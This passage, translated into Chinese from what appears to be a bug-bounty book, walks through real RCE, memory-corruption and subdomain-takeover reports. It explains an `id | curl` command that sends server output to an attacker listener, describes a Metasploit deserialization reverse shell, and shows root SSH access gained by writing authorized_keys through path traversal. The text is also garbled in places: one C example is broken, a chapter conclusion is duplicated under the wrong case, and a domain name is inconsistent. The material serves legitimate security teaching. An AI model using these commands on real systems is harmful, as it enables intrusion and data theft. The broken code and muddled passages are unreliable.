管道（|）将一个命令的输出传递给下一个命令。在这种情况下，`id` 的输出被传递给 `curl http://SOMEADDRESS:8080/-d -`。cURL 库发起远程 HTTP 请求，在这种情况下，它向 Sadeghipour 的 IP 地址发送请求，该地址正在监听 8080 端口。`-d` 标志是 cURL ，用于作为 POST 请求发送数据。`@` 指示 cURL 按照其接收到的原样使用输入。连字符（-）表示将使用标准输入。当所有这些语法与管道（|）结合时，`id` 命令的输出将作为 POST 体传递给 cURL，而不进行任何处理。最后，`>dev/null` 代码会丢弃命令的任何输出，这样就不会有内容打印到受漏洞的服务器终端。这有助于防止目标察觉。

在上传之前，Sadeghipour 使用 Netcat 启动了一个服务器进行监听，Netcat 是一种常用的读写工具。`-l` 标志启用监听模式，`-n` 防止 DNS 查询，`-vv` 启用详细模式，`-p 8080` 定义端口。在上传后，Sadeghipour 收到了以下 POST 请求，来自 Polyvore：

```
POST / HTTP/1.1
User-Agent: [REDACTED]
Host: [REDACTED]
Accept: /
Content-Length: [REDACTED]
Content-Type: application/x-form-urlencoded
uid=[REDACTED] gid=[REDACTED]
```

该请求意味着 Sadeghipour 的 MVG 文件执行成功。

## 启示

从这里有两个重要的启示。首先，了解披露的漏洞为你提供了测试新代码的机会，正如前面的章节所述。如果你正在测试大型库，还要确保你正在测试的网站的公司正在妥善管理安全。有些计划要求你在披露后的一时间内不要报告，但之后你就可以了。其次，在自己的服务器上重现漏洞是一个极佳的学习机会。它确保了当你尝试将其用于赏金计划时，你的负载是有效的。

当 Rails 对 cookie 签名时，它会在 cookie 的 base64 编码值末尾附加一个签名。例如，一个 cookie 及其签名可能像这样：`BAh7B0kiDiD3N3pb25faWQGdOxM3M9BjsARg3D%3D--dc40a55cd52fe32bb3b`。Rails 会检查双破折号之后的签名，以确保 cookie 未被篡改。这在 Rails 使用 cookastore 时非常重要，因为 Rails 默认使用 cookie 及其签名来管理网站会话。用户信息可以被添加到 cookie 中，并在通过 HTTP 请求提交时由服务器读取。由于 cookie 保存在个人的计算机上，Rails 使用密钥（secret）对 cookie 签名，以确保其未被篡改。读取 cookie 的方式也很重要；Rails cookastore 会序列化和反序列化存储在 cookie 中的信息。

在计算机科学中，序列化是将对象或数据转换为允许其传输和重建的状态的过程。在这种情况下，Rails 将会话信息转换为可以存储在 cookie 中、并在用户在下一次 HTTP 请求提交 cookie 时重新读取的格式。序列化之后，通过反序列化读取 cookie。反序列化过程非常复杂，超出了本书的讨论范围。但如果传递了不可信的数据，它经常会导致 RCE（远程代码执行）。

> 注意：要了解更多关于序列化的知识，请参考这两个优秀的资源：Matthias Kaiser 的“Exploiting Deserialization Vulnerabilities in Java”演讲，地址 https://www.youtube.com/watch?v=VIy3O-euVQl 以及 Alvaro Muñoz Alexandr Mirosh 的“Friday the 13th JSON attacks”演讲，地址 https://www.youtube.com/watch?v=ZBFIYok_WrUr。

知道 Rails secret 意味着 Prins 可以创建自己的有效序列化对象，并将其发送到网站通过 cookie 进行反序列化。如果存在漏洞，反序列化将导致 RCE。

Prins 使用了一个名为 Rails Secret Deserialization 的 Metasploit Framework 漏洞将此漏洞升级为 RCE。该 Metasploit 漏洞创建一个 cookie，如果被成功反序列化，将调用反向 shell。Prins 将恶意 cookie 发送到 Algolia，从而在受漏洞服务器上开启了 shell。作为概念证明，他运行了 `id` 命令，返回了 `uid=1000(prod) gid=1000(prod) groups=1000(prod)`。他还在服务器上创建了 `hackerone.txt` 文件来证明该漏洞。

# 结语

在此案例中，Prins 使用自动化工具爬取公共仓库中的敏感值。通过同样的方法，你也可以发现任何使用可疑关键词的仓库，这可能会引导你发现漏洞。利用反序列化漏洞可能非常复杂，但存在一些自动化工具可以使其变得更容易。例如，你可以针对早期版本的 Rails 使用 Rapid7 的 Rails Secret Deserialization，并使用由 Chris Frohoffhoff 维护的 ysoserial 处理 Java 反序列化漏洞。

# 通过 SSH 实现 RCE

难度：高

URL：N/A

**来源：** blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/

**报告日期：** 2017 年秋季

**赏金金额：** 未公开

当目标程序为你提供一个较大的范围进行测试时，最佳做法是自动化资产发现，然后寻找网站可能包含漏洞的细微迹象。这正是 Jasmin Landry 在 2017 年秋季所做的。他开始使用 Sublist3r、Aquatone 和 Nmap 工具对网站进行子域名和开放端口枚举。由于他发现了数百个可能的域名且无法访问所有域名，因此使用自动化的 EyeWitness 对每个域名进行截图。这帮助他通过视觉识别了网站。

EyeWitness 显示了一个 Landry 并不熟悉、看起来很旧且是开源的内容管理系统。Landry 猜测该软件的默认凭据可能是 `admin:admin`。测试发现这是有效的，于是他继续深入挖掘。该网站没有任何内容，对开源代码的审计发现应用程序以 root 用户身份在服务器上运行。这是一种糟糕的做法：root 用户可以在网站上执行任何操作，如果应用程序被攻破，攻击者将获得服务器的完全权限。这是 Landry 继续深入挖掘的另一个原因。

接下来，Landry 寻找*已公开的安全问题*（即 CVE）。该网站没有任何漏洞，这对于旧的开源软件来说是不寻常的。Landry 识别了一些较不严重的问题，包括 XSS、CSRF、XXEs 和本地文件泄露（读取服务器上任意文件的能力）。所有这些漏洞都意味着某处可能存在 RCE。

继续工作时，Landry 注意到了一个允许用户更新模板文件的 API 端点。路径为 `/api/i/services/site/write-configuration.json?path=/config/sites/test/page/test/config.xml`，它通过 POST 体接受 XML。写入文件和定义其路径的能力是两个严重的红旗。如果 Landry 可以在任何地方写入文件并让服务器将其解释为应用程序文件，他就可以在服务器上执行任何想要的操作并可能调用系统调用。为了测试这一点，他将路径更改为 `../../../../../../tmp/test.txt`。符号 `../` 指当前路径中的上一个目录。因此，如果路径是 `/api/i/services`，`../` 就是 `/api/i`。这允许 Landry 在任何想要的文件夹中写入内容。

上传自己的文件成功了，但应用程序配置无效。应用程序配置不允许他执行代码，因此他需要另一种路径。由于最初的文件上传尝试失败，Landry 重新考虑了他的方法。他意识到可以利用 SSH 配置，而不仅仅是报告任意写入漏洞。由于他可以在任何地方写入文件并让服务器将其解释为文件，他能够向 `../../../../root/.authorized_keys` 写入。这允许他使用 SSH 进入服务器。因为应用程序以 root 用户身份运行，他能够覆盖 SSH 密钥以便以 root 登录。作为概念证明，他运行了 `id` 命令，返回了 `uid=0(root) gid=0(root) groups=0(root)`。这充分证明了该漏洞。

# 结语

在此案例中，Prins 使用自动化工具爬取公共仓库中的敏感值。通过同样的方法，你也可以发现任何使用可疑关键词的仓库，这可能会引导你发现漏洞。利用反序列化漏洞可能非常复杂，但存在一些自动化工具可以使其变得更容易。例如，你可以针对早期版本的 Rails 使用 Rapid7 的 Rails Secret Deserialization，并使用由 Chris Frohoffhoff 维护的 ysoserial 处理 Java 反序列化漏洞。

## 总结

RCE 与本书讨论的许多其他漏洞一样，通常发生在用户输入没有被正确过滤时。在第一个漏洞报告中，ImageMagick 在传递系统命令之前没有正确转义内容。为了找到这个漏洞，Sadeghipour 首先在自己的服务器上重建了该漏洞，然后寻找未补补的服务器。相比之下，Prins 发现了一个允许他伪造签名 cookie 的密钥。最后，Landry 找到了一种在服务器上写入任意文件的方法，并用其覆盖 SSH 密钥以便以 root 登录。这三者使用了不同的方法获取 RCE，但都利用了网站接受未过滤输入的弱点。

## 13 内存漏洞

![img/0e0c482eb94dba4b95528b396562dd10_260_0.png](img/0e0c482eb94dba4b95528b396562dd10_260_0.png)

每个应用程序都依赖计算机内存来存储和执行应用程序代码。内存漏洞利用应用程序内存管理中的缺陷。

内存漏洞发生在开发者需要负责应用程序内存管理的编程语言中，例如 C 和 C++。其他语言（如 Ruby、Python、PHP 和 Java）为开发者管理内存分配，使得这些语言不太受内存漏洞的影响。

在 C 或 C++ 中执行任何动态操作之前，开发者必须确保为该操作分配了适当的内存。例如，假设你正在编写允许用户导入交易的动态银行应用程序。当应用程序运行时，你不知道用户将导入多少交易。有些可能导入一个，有些可能导入一千个。语言

在内存管理方面，你必须检查正在导入事务的数量，然后为它们分配适当的内存。当开发者没有考虑到应用程序需要多少内存时，就会发生缓冲区溢出等错误。

发现和利用内存漏洞是复杂的，关于这个主题已经写了整本书的书。因此，本章通过介绍许多内存漏洞中的两种（即缓冲区溢出和越界漏洞）对该主题进行了了介绍。如果你兴趣学习更多知识，我推荐阅读 Jon Erickson 的《黑客攻击防术》（*Hacking: The Art of Exploitation*）或 Tobias Klein 的《漏洞猎日记：软件安全荒野之旅》（*A Bug Hunter’s Diary: A Guided Tour Through the Wilds of Software Security*）；这两本书都由 No Starch Press 出版。

## 缓冲区溢出

缓冲区溢出漏洞是一种错误，应用程序写入的数据大于为该数据分配的内存（缓冲区）。缓冲区溢出最好的情况下会导致不可预测的程序行为，最坏的情况下会导致严重的漏洞。当攻击者能够控制溢出并执行自己的代码时，他们可能会破坏应用程序，或者根据用户权限破坏整个服务器。这种漏洞类似于第 12 章中的 RCE（远程代码执行）示例。

缓冲区溢出通常发生在开发者忘记检查写入变量的数据大小时。它们也可能发生在开发者在计算数据所需的内存大小时出现错误时。由于这些错误可能以任何方式发生，我们将只检查一种类型——长度检查缺失。在 C 语言语言中，遗漏长度检查通常涉及修改内存的函数，例如 `strcpy()` 和 `memcpy()`。但当开发者使用内存分配函数（如 `malloc()` 或 `calloc()`）时，也可能发生此类检查。`strcpy()` 函数（以及 `memcpy()`）接受两个参数：一个要拷贝数据的数据的缓冲区和要拷贝的数据。这里有一个 C 语言的示例：

```c
#include <string.h>
int main()
{
    ① src[16]="hello world";
    ② dest[16];
    ③(dest, src);
    printf("src is %s\n", src);
    printf("dest is %s\n", dest);
    return 0;
}
```

在这个示例中，字符串 ① 被设置为字符串 "hello world"，长度为 11 个字符（包括空格）。这段代码为 src 和 dest 分配了 16 字节（每个字符占 1 字节）。由于每个字符需要 1 字节内存，且字符串必须以空字节（⓪）结束，"hello world" 字符串总共需要 12 字节，这在 16 字节的分配范围内。`strcpy()` 函数获取 src 中的字符串并将其拷贝到 dest ③。④ 处的 printf 语句输出如下：

src is hello world

dest is hello world

这段代码按预期工作，但如果有人真的想强调那个问候呢？考虑这个示例：

```c
#include <string.h>
#include <stdio.h>
int main() {
  char src[17]="hello world!!!!!";
  char dest[16];
  strcpy(dest, src);
  printf("src is %s\n", src);
  printf("dest is %s\n", dest);
  return 0;
}
```

在这里，增加了五个感叹号，使字符串的总字符数增加到 16。开发者记得 C 语言中所有字符串必须以空字节（⓪）结束。他们为 src ① 分配了 17 字节，但忘记对 dest ② 采取同样的操作。编译并运行程序后，开发者会看到此输出：

src is

dest is hello world!!!!!

尽管被赋值为 'hello world!!!!!'，src 变量却是空的。这是因为 C 分配栈内存的方式。内存地址是增量分配的，因此程序中早定义的变量的内存地址比后定义的变量低。在这种情况下，src 被添加到内存栈，然后是 dest。当溢出发生时，'hello world!!!!!' 的 17 个字符被写入 dest 变量，但字符串的空字节 (\0) 溢到了 src 变量的第一个字符。由于空字节表示字符串的结束，src 看起来是空的。

图 13-1 展示了当每行代码从 ① 到 ⓷ 执行时栈的样子

| src | h e l l o | w o r l d ! ! ! ! ! | \0 |
|---|---|---|---|
| Memory | 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 | |
| dest | h e l l o | w o r l d ! ! ! ! ! | \0 |
|---|---|---|---|
| Memory | 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 | |
| dest | h e l l o | w o r l d ! ! ! ! ! | |
|---|---|---|---|
| src | \0 e l l o | w o r l d ! ! ! ! ! | \0 |
| Memory | 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 | |

图 13-1：内存如何从 dest 溢出到 src

在图 13-1 中，src 被添加到变量中，变量在图中从 ① 开始标记。接下来，添加 dest。当溢出发生时，'hello world!!!!!' 的 17 个字符被写入 dest 变量，但字符串的空字节 (\0) 溢到了 src 变量的第一个字符。由于空字节表示字符串的结束，src 看起来是空的。



## PHP FTP_GENLIST() 整数溢出

**难度:** 高

**URL:** N/A

**来源:** [https://bugs.php.net/bug.php?id=69545/](https://bugs.php.net/bug.php?id=69545/)

**报告日期:** 2015年4月28日

**赏金:** $500

为开发者管理内存的语言并非不受内存漏洞的影响。尽管 PHP 会自动管理内存，但该语言是用 C 编写的，而这需要内存管理。因此，PHP 内置函数可能会存在内存漏洞。Max Spelsberg 在发现 PHP FTP 扩展中的缓冲区溢出时就遇到了这种情况。

PHP 的 FTP 扩展读取输入的数据（如文件），以便在 `ftp_genlist()` 函数中跟踪接收的大小和行数。大小和行数的变量初始化为无符号整数。在 32 位机器上，无符号整数的内存分配最大为 $2^{32}$ 字节（4,294,967,295 字节或 4GB）。因此，如果攻击者发送了超过 $2^{32}$ 字节的数据，缓冲区就会溢出。

作为其概念证明的一部分，Spelsberg 提供了启动 FTP 服务器的 PHP 代码和用于连接到服务器的 Python 代码。一旦建立连接，他的 Python 客户端通过套接字连接向 FTP 服务器发送了 $2^{32} + 1$ 字节。PHP FTP 服务器崩溃了，因为 Spelsberg 覆盖了内存，这与之前讨论的缓冲区溢出示例类似。

### 启示

缓冲区溢出是一种广为人知且记录详实的漏洞类型，但你仍然可以在管理内存的应用程序中发现它们。即使应用程序不是用 C 或 C++ 编写的，如果应用程序是用另一种容易出现内存管理漏洞的语言编写的，你仍然可能发现缓冲区溢出。在这些情况下，请寻找省略了变量长度检查的地方。

## PYTHON HOTSHOT 模块

**难度:** 高

**URL:** N/A

**来源:** [http://bugs.python.org/issue/24481](http://bugs.python.org/issue/24481)

**报告日期:** 2015年6月20日

**已付赏金:** $500

和 PHP 一样，Python 编程语言传统上是用 C 编写。事实上，它有时被称为 CPython（用其他语言编写的 Python 版本也存在 Jython、PyPy 等）。Python hotshot 模块是现有 Python profile 模块的替代品。hotshot 模块描述了程序部分执行的频率和时长。Hotshot 用 C 编写的，因此它对性能的影响比现有的 profile 模块小。

但在 2015 年 6 月，John Leitch 在代码中发现了一个缓冲区溢出，允许攻击者将字符串从一个内存位置复制到另一个位置。

漏洞代码调用了 `memcpy()` 方法，该方法从一个位置复制指定数量的内存到另一个位置。例如，漏洞代码如下：

```
memcpy(self->buffer + self->index, s, len);
```

`memcpy()` 方法接受三个参数：目标、源和要复制的字节数。在示例中，这些值是变量 `self->buffer + self->index`（缓冲区和索引长度之和）、`s` 和 `len`。

目标变量 `self->buffer` 始终具有固定长度。但源变量 `s` 可以是任何长度。这意味着在执行复制函数时，`memcpy()` 不验证它正在写入的缓冲区的大小。攻击者可以向函数传递一个比分配用于复制的字节数更长的字符串。字符串将写入目标位置并溢出，因此它将继续写入预定缓冲区之外并进入其他内存。

### 启示

发现缓冲区溢出的方法之一是寻找 `strcpy()` 和 `memcpy()` 函数。如果你发现了这些函数，请验证它们是否有适当的缓冲区长度检查。你需要从发现的代码反向推导，以确认你是否可以控制源和目标以溢出分配的内存。

## LIBCURL 越界读取

**难度:** 高

**URL:** N/A

**来源:** [http://curl.haxx.se/docs/adv_20141105.html](http://curl.haxx.se/docs/adv_20141105.html)

**报告日期:** 2014年11月5日

**已付赏金:** $1,000

Libcurl 是一个免费的客户端侧 URL 传输库，cURL 命令行工具使用它来传输数据。Symeon Paraschoudis 在 `libcurl_easy_duphand` 函数中发现了一个漏洞，该漏洞可以被用于泄露敏感数据。

当使用 libcurl 执行传输时，你可以使用 `CURL_POSTFIELDS` 标志通过 POST 请求传递数据。但执行此操作不能保证数据在操作过程中会被保留。为了确保数据在通过 POST 请求发送时不会被更改，另一个标记 `CURL_COPYPOSTFIELDS` 会复制数据的内容并随 POST 请求发送该副本。内存区域的大小通过另一个名为 `CURL_POSTFIELDS` 的变量设置。

为了复制数据，cURL 会分配内存。但用于复制数据的内部 libcurl 函数有两个问题：首先，错误地复制 POST 数据会导致 libcurl 将 POST 数据缓冲区视为 C 语言字符串。libcurl 会假设 POST 数据以空字节（null byte）结束。当数据并非以空字节结束时，libcurl 将继续在分配的内存之外读取字符串，直到找到空字节为止。这可能导致 libcurl 复制一个太小的字符串（如果找到了空字节）或过大的字符串。其次，它复制了数据。

### 启示

发现缓冲区溢出的一种方法是寻找 `strcpy()` 和 `memcpy()` 函数。如果你发现了这些函数，请验证它们是否有适当的缓冲区长度检查。你需要从发现的代码反向推导，以确认你是否可以控制源和目标以溢出分配的内存。

## 总结

cURL 命令行工具是一个非常流行的数据传输库。尽管它很流行，仍然存在漏洞。如果你想搜索这些，我建议也阅读关于该主题的其他书籍。

内存漏洞可以允许攻击者读取或运行自己的代码，但子域名很难发现。

# 14 子域名接管

子域名接管发生在用户可以控制 A 记录或 CNAME 记录指向的 IP 地址或 URL 时。这种漏洞的一个常见示例涉及网站托管平台 Heroku。

## 理解域名

为了理解子域名接管漏洞如何工作，我们首先需要查看如何注册和使用域名。域名是访问网站的 URL，通过域名系统（DNS） 映射到 IP 地址。域名组织为层次结构，每个部分之间用点分隔。域名的最后部分（最右侧部分）是顶级域名。顶级域名的示例包括 .com、.ca、.info 等。层级中的上级是个人或公司注册的域名。这部分层级访问网站。例如，假设 `<example>.com` 是一个带有 .com 顶级域名的注册域名。层级的下一步是本章的重点：子域名。子域名组成 URL 的左侧部分，可以在同一个注册网上托管不同的网站。例如，如果 Example 公司有一个面向客户的网站，但还需要一个电子邮件网站，它可以拥有 `www.<example.com>` 和 `webmail.<example.com>` 子域名。每个子域名都可以提供自己的站点内容。

站点所有者可以使用多种方法创建子域名，但两种常用方法是在站点记录中记录 A 记录或 CNAME 记录。A 记录将站点名称映射到一个或多个 IP 地址。CNAME 应该是将站点名称映射到另一个站点名的唯一记录。只有站点管理员可以为站点创建 DNS 记录（除非发现了漏洞）。

## 子域名接管的工作原理

子域名接管发生在用户可以控制 A 记录或 CNAME 记录指向的 IP 地址或 URL 时。这种漏洞的一个常见示例涉及网站托管平台 Heroku。在典型的工作流中，站点开发者创建一个应用程序并将其托管在 Heroku 上。然后开发者为主站的子域名创建一个 CNAME 记录，并将子域名指向 Heroku。这里有一个可能出现问题的假设性示例：

1. Example Company 在 Heroku 平台上注册了一个账户，但没有使用 SSL。
2. Heroku 为 Example Company 的新应用分配了子域名 `unicorn457.herokuapp.com`。
3. Example Company 在其 DNS 供应商提供商处创建了一个 CNAME 记录，将子域名 `test.<example>.com` 指向 `unicorn457.herokuapp.com`。
4. 几个月后，Example Company 决定删除其 `test.<example>.com` 子域名。它关闭了 Heroku 账户，并从其服务器上删除了站点内容。但它没有删除 CNAME 记录。
5. 一名恶意人员注意到 CNAME 记录指向 Heroku 上一个未注册的 URL，并声称拥有了域名 `unicorn457.heroku.com`。
6. 攻击者现在可以从 `test.<example>.com` 提供他们自己的内容，由于 URL 的原因，这看起来是一个合法的 Example Site。

如你所见，这种漏洞经常发生在网站没有删除指向攻击者可以认领的外部网站的 CNAME（或 A 记录）时。经常与子域名接管相关的常用外部服务包括 Zendesk、Heroku、GitHub、Amazon S3 和 SendGrid。

子域名接管的影响取决于子域名和父域的配置。例如，在“Web Hacking Pro Tips #8”（https://www.youtube.com/watch?v=76TIDwastyk）中，Arne Swinnen 描述了如何对 cookie 进行范围限制，以便浏览器只向适当域名发送 cookie。但也可以通过仅将子域名指定为点来限制 cookie，让浏览器向所有子域名发送 cookie，例如值 `.<example>.com`。当网站具有此类配置时，浏览器将向用户访问的任何 Example Company 子域名发送 `<example>.com` 的 cookie。如果攻击者控制了 `test.<example>.com`，他们就可以从访问恶意 `test.<example>.com` 子域的目标用户那里窃取 `<example>.com` 的 cookie。

或者，如果 cookie 没有这样进行范围限制，恶意攻击者仍然可以在子域名上创建一个仿造父域的站点。如果攻击者在子域名上包含一个登录页面，他们就可能钓鱼用户提交他们的凭据。子域名接管使得两种常见攻击成为可能。但在接下来的示例中，我们还将查看其他攻击，例如电子邮件截获。

发现子域名接管漏洞涉及查找网站的 DNS 记录。实现此点的极佳方法是使用 KnockPy 工具，它可以枚举子域名并搜索来自 S3 等服务的常见子域名接管相关错误消息。KnockPy 附带了一个待测试的常用子域名列表，但你也可以提供自己的子域名列表。GitHub 仓库 SecLists（https://github.com/danielmessler/SecLists/）在它的许多其他安全相关列表中也列出了常见的发现子域名。

## UBIQUITI 子域名接管

**难度：** 低

**URL：** http://assets.gobiquiti.com/

**来源：** https://hackerone.com/reports/109699/

**报告日期：** 2016年1月10日

**赏金：** $500

Amazon Simple Storage（或 S3）是 Amazon Web Services (AWS) 提供的文件托管服务。S3 上的账户是一个存储桶（bucket），你可以使用特殊的 AWS URL 访问，该 URL 以桶名称开头。Amazon 对存储桶 URL 使用全局命名空间，这意味着一旦有人注册了存储桶，其他人就无法注册它。例如，如果我注册了存储桶 `<example>`，它将拥有 URL `<example>.s3.amazaws.com`，并且我拥有它。Amazon 还允许用户注册他们想要的任何名称，只要该名称未被占用，这意味着攻击者可以认领任何未注册的 S3 存储桶。

在该报告中，Ubiquiti 为 `assets.gobiquiti.com` 创建了一个 CNAME 记录，并将其指向 S3 存储桶 `un-images`。该桶可以通过 URL `un-images.s3.website.us-west-1.amazonaws.com` 访问。因为 Amazon 在全球范围内都有服务器，URL 包含了存储桶所在的 Amazon 地理区域信息。在这种情况下，`us-west-1` 是北加利福尼亚。

Ubiquiti 要没有注册该桶，就是从其 AWS 账户中删除了它但没有删除 CNAME 记录。因此，访问 `assets.gobiquiti.com` 仍然尝试从 S3 提供内容。结果，一名黑客认领了该 S3 桶并向 Ubiquiti 报告了该漏洞。

### 启示

留意指向 S3 等第三方服务的 DNS 条目。当你发现此类条目时，确认公司是否已正确配置了该服务。除了对网站的 DNS 记录进行初始检查外，你还可以使用 KnockPy 等自动化工具持续监控条目和服务。最好是这样做，以防公司删除了子域名但忘记更新其 DNS 记录。

## SCAN.ME 指向 ZENDESK

**难度：** 低

**URL：** http://support.scan.me/

**来源：** https://hackerone.com/reports/114134/

**报告日期：** 2016年2月2日

**赏金：** $1,000

Zendesk 平台在网站的子域名上提供客户支持服务。例如，如果 Example Company 使用 Zendesk，其关联子域名可能是 `support.<example>`。

与之前的 Ubiquiti 示例类似，scan.me 的所有者创建了一个 CNAME 记录，将 `support.scan.me` 指向 `scan.zendesk.com`。随后，Snapchat 收购了 scan.me。在收购前后，`support.scan.me` 在 Zendesk 上释放了该子域名，但忘记删除 CNAME 记录。黑客 harry_mg 发现了该子域名并认领了 `scan.zendesk.com`。

### 启示

留意指向 Zendesk 等第三方服务的 DNS 条目。当你发现此类条目时，确认公司收购后如何提供服务。由于子域名可能在任何时间发生变化，如果公司不更新 DNS 记录，这些变化可能导致子域名接管。

## SHOPIFY WINDSOR 子域名接管

**难度：** 低

**URL：** http://windsor.shopify.com/

**来源：** https://hackerone.com/reports/150374

**报告日期：** 2016年7月10日

**赏金：** $500

并不是所有子域名接管都涉及在第三方服务注册账户。2016年7月，黑客 vseano 发现 Shopify 为 `windsor.shopify.com` 创建了一个指向 `asofwindor.com` 的 CNAME。他是通过在 crt.sh 上搜索所有 Shopify 子域名发现此点的，因为所有 SSL 证书必须向证书颁发机构注册，以便浏览器在访问站点时验证证书的真实性。

crt.sh 随时间跟踪这些注册并向访问者提供信息。站点还可以注册通配符证书，为任何子域名提供保护。在 crt.sh 上，这通过子域名处的星号表示。

当站点注册通配符证书时，crt.sh 无法识别其使用的子域名，但每个证书都包含一个唯一的哈希值。另一个站点 censys.io 通过扫描互联网跟踪证书哈希及其使用的子域名。在 censys.io 上搜索证书哈希可能会让你识别新的子域名。

通过浏览 crt.sh 子域名列表并访问每一个，vseano 注意到 `windsor.shopify.com` 返回了 404 页面。这意味着 Shopify 要么没有从子域名提供内容，要么不再拥有 `aslinwindor.com`。测试后者，vseano 访问了域名注册网站，搜索了 `aslinwindor.com`，并发现可以以 $10 购买。他购买了并向 Shopify 报告了该子域名接管漏洞。

### 启示

并不是所有子域名都涉及使用第三方服务。如果你发现一个指向另一个域名并返回 404 页面的子域名，检查你是否可以注册该域名。crt.sh 提供的站点注册的 SSL 证书是一个极佳参考，作为识别子域的初始步骤。如果在 crt.sh 上注册了通配符证书，请在 censys.io 上搜索证书哈希。

## SNAPCHAT：FASTLY 接管

**难度：** 中等

**URL：** http://fastly.sc-cdn.net/takeover.html

**来源：** https://hackerone.com/reports/154425/

**报告日期：** 2016年7月27日

**赏金：** $3,000

Fastly 是一个内容分发网络（CDN）。CDN 在全球的服务器上存储内容的副本，以便为请求内容的用户以更短的时间更近的距离交付内容。

2016年7月27日，黑客 Ebertas 向 Snapchat 报告称其 `sc-cdn.net` 域名存在 DNS 配置错误。URL `http://fastly.sc-cdn.net` 拥有一个 CNAME 记录，指向一个 Snapchat 尚未正确认领的 Fastly 子域名。当时，如果用户使用传输层安全协议（TLS）对流量进行加密并使用 Fastly 共享通配符证书进行加密，Fastly 允许用户注册自定义子域名。自定义子域名的配置错误会导致域名上显示错误信息，内容为“Fastly error: unknown domain: `<misconfigured domain>`. Please check that this domain has been added to a service”。

在报告漏洞之前，Ebertas 在 censys.io 上查询了域名 `sc-cdn.net`，并通过使用该域名 SSL 证书上的注册信息确认了 Snapchat 对该域名的所有权。这一点很重要，因为 `sc-cdn.net` 域名不像 `snapchat.com` 那样明确包含任何 Snapchat 的身份信息。他还配置了一个服务器来接收来自该 URL 的流量，以确认该域名确实在使用中。



# 在解决该报告时

Snapchat 确认极小部分用户在使用其旧版本的 App，该版本向此子域名请求未经身份验证的内容。用户的配置稍后得到了刷新，并指向了另一个 URL。理论上，攻击者可以在该有限时间内通过该子域名向用户提供恶意文件。

## 启示

- 留意指向会返回错误信息的服务的网站。
- 当你发现错误时，通过阅读其文档来确认这些服务是如何使用的。
- 然后检查你是否可以找到允许你接管子域名的配置错误。
- 此外，始终采取额外步骤来确认你认为是漏洞的地方。在这种情况下，Ebertas 查询了 SSL 证书信息，以在报告之前确认 Snapchat 拥有该域名。然后他配置了自己的服务器来接收请求，确保 Snapchat 正在使用该域名。

# LEGAL ROBOT 接管

**难度：** 中等

**URL：** `https://api.legalrobot.com/`

**来源：** `https://hackerone.com/reports/148770/`

**报告日期：** 2016年7月1日

**赏金：** $100

即使网站在第三方服务上正确配置了其子域名，这些服务本身也可能受到配置错误的影响。这就是 Frans Rosen 在 2016年7月1日发现的，当时他向 Legal Robot 提交了一份报告。他通知公司，他有一个指向 `api.legalrobot.com` 的 DNS CNAME 条目指向 Modulus.io，而他是可以接管该内容的。

你现在可能已经意识到，在看到此类错误页面后，黑客的下一步应该是访问该服务以认领该子域名。但尝试认领 `api.legalrobot.com` 导致了错误，因为 Legal Robot 已经认领了它。

Rosen 并没有离开，而是尝试认领 Legal Robot 的通配符域名 `*.legalrobot.com`，该域名是可用的。Modulus 的配置允许通配符子域名覆盖更具体的子域名，在本文例中就包含了 `api.legalrobot.com`。在认领通配符域名后，Rosen 能够在 `api.legalrobot.com` 上托管他自己的内容，如图 14-1 所示。

```
view-source:https://api.legalrobot.com
'HELLO WORLD! <!--FRANS ROSEN->
```

图 14-1：作为 Frans Rosen 认领的子域名概念证明的 HTML 页面源代码。

注意 Rosen 在图 14-1 中托管的内容。他没有发布一个显示子域名已被接管的尴尬页面，而是使用了一个非侵入性的文本页面，并带有一个 HTML 注释证明他对该内容负责。

## 启示

- 当网站依赖第三方服务来托管子域名时，它们也在依赖该服务的安全性。
- 在此例中，Legal Robot 认为它已经在 Modulus 上正确地认领了其子域名，但实际上该服务存在一个漏洞，允许通配符子域名覆盖所有其他子域名。
- 还要记住，如果你能够认领一个子域名，最好使用一个非侵入性的概念证明进行报告，以避免让你所报告的 la 感到尴尬。

# UBER SENDGRID 接管

**难度：** 中等

**URL：** `https://em.uber.com/`

**来源：** `https://hackerone.com/reports/156536/`

**报告日期：** 2016年8月4日

**赏金：** $10,000

SendGrid 是一个云端电子邮件服务。在本文写作期间，Uber 是其客户之一。当黑客 Trojan Rijal 审查 Uber 的 DNS 记录时，他注意到 `em.uber.com` 有一个指向 SendGrid 的 CNAME 记录。

由于 Uber 有一个 SendGrid CNAME，Rijal 决定研究一下该服务以确认 Uber 是如何配置的。他的第一步是确认 SendGrid 提供的服务以及它是否允许内容托管。它不允许。通过深入研究 SendGrid 的文档，Rijal 发现了一个名为“白标（white labeling）”的不同选项。白标是一项允许互联网服务供应商确认域名真实性的功能。该权限通过通过为网站创建邮件交换（MX）记录来授予。MX 记录是 DNS 记录的一种，指定负责发送和接收电子邮件的邮件服务器。

白标功能吸引了 Rijal 的注意，因为它涉及到信任第三方提供商。当 Rijal 检查 `em.uber.com` 的 DNS 条目时，他确认了一个 MX 记录指向 `sendgrid.net`。但只有网站所有者才能创建 DNS 记录（假设没有漏洞），因此 Rijal 无法直接修改 Uber 的 MX 记录。相反，他转向了 SendGrid 的文档，文档描述了入站解析（Inbound Parse）。该服务允许客户解析邮件附件和内容，然后将其发送到指定的 URL。要使用该功能，网站需要：

1. 为域名/主机或子域名创建 MX 记录并将其指向 `sendgrid.net`。
2. 在解析设置页面上将域名/主机和 URL 关联到入站解析 Webhook。

找到了。Rijal 已经确认了 MX 记录存在，但 Uber 还没有设置第二步。Uber 没有将 `em.uber.com` 子域名关联为入站解析 Webhook。Rijal 认领了该域名作为他自己的，并配置了一个服务器来接收 SendGrid 解析 API 发送的数据。在确认可以接收电子邮件后，他停止了拦截并向 Uber 和 SendGrid 报告了该问题。作为修复的一部分，SendGrid 确认它已添加了额外的安全检查，要求账户在允许入站解析 Webhook 之前验证其域名。结果，该安全检查应该保护其他网站免受类似的攻击。

## 启示

此报告证明了第三方文档有多有价值。通过阅读开发者文档、了解 SendGrid 提供哪些服务并识别这些服务是如何配置的，Rijal 发现了一个影响 Uber 的第三方服务漏洞。当目标网站使用第三方服务时，探索这些服务提供的所有功能是非常关键的。EdOverflow 维护了一个存在漏洞的服务列表，你可以在 `https://github.com/EdOverflow/can-i-take-over-xyz/` 找到。即使他的列表显示某服务受保护的，也要双重检查或寻找替代方法，正如 Rijal 所做的那样。

## 总结

